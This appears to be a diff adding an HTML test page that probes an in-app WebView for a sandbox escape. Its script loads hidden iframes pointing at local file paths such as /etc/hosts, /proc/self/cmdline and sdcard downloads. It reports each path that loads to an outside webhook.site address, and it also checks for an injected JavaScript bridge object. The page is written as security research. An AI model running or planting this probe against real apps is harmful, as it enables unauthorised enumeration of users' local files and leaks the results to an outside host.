@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Iframe Sandbox Escape Test</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
+        .test-card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 15px; margin-bottom: 20px; }
+        .log-window { background: #010409; border: 1px solid #30363d; color: #7ee787; padding: 10px; font-family: monospace; font-size: 12px; height: 150px; overflow-y: auto; border-radius: 6px; }
+        button { background: #238636; color: white; border: none; padding: 10px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px; }
+        iframe { width: 1px; height: 1px; visibility: hidden; }
+    </style>
+</head>
+<body>
+
+    <div class="test-card">
+        <h3>Iframe File Access Test</h3>
+        <p style="font-size: 13px; color: #8b949e;">Testing if local paths can be loaded into an iframe context.</p>
+        
+        <button onclick="startIframeScan()">Start Iframe Enumeration</button>
+        
+        <div id="logs" class="log-window">> Waiting for scan...</div>
+    </div>
+
+    <div id="iframeContainer"></div>
+
+    <script>
+        const webhook = "https://webhook.site/ccc5a516-132a-4a1b-9d20-dc323e820bd3";
+        const pathsToTest = [
+            "file:///etc/hosts",
+            "file:///storage/emulated/0/Download/about.jpg",
+            "file:///sdcard/Download/test.txt",
+            "file:///proc/self/cmdline"
+        ];
+
+        function log(msg) {
+            const logs = document.getElementById('logs');
+            logs.innerHTML += "<br>> " + msg;
+            logs.scrollTop = logs.scrollHeight;
+        }
+
+        async function startIframeScan() {
+            log("Scan started...");
+            const container = document.getElementById('iframeContainer');
+            container.innerHTML = ""; // Clear previous tests
+
+            pathsToTest.forEach(path => {
+                let ifr = document.createElement('iframe');
+                ifr.src = path;
+                
+                // Success/Load Check
+                ifr.onload = function() {
+                    log("<span style='color:#f85149;'>POSSIBLE SUCCESS:</span> " + path);
+                    // Exfiltrate success to webhook
+                    fetch(webhook + "?iframe_load_success=" + btoa(path));
+                };
+
+                // Error Check (WebView usually blocks this)
+                ifr.onerror = function() {
+                    log("Blocked/Failed: " + path);
+                };
+
+                container.appendChild(ifr);
+            });
+            
+            log("All iframes injected. Monitoring responses...");
+            
+            // Bridge Injection check (Already found in your screenshots)
+            if(window.iabjs_unified_bridge) {
+                log("Active Bridge Detected: iabjs_unified_bridge");
+            }
+        }
+    </script>
+</body>
+</html>
